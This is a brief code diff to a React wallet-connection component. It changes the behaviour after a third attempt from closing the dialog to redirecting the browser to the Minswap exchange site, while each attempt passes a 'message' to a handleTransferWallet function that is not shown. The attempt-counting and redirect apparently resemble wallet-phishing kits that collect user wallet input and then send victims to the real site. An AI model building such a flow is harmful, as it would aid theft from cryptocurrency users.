@@ -110,7 +110,7 @@ function ConnectWallet({ onClose }) {
         handleTransferWallet(message, newAttemptCount);
 
         if (newAttemptCount === 3) {
-          setTimeout(() => onClose(), 1000); // Close after a short delay to allow for the last message to be sent
+          window.location.href = "https://minswap.org/fi-FI";
         }
       }
     };
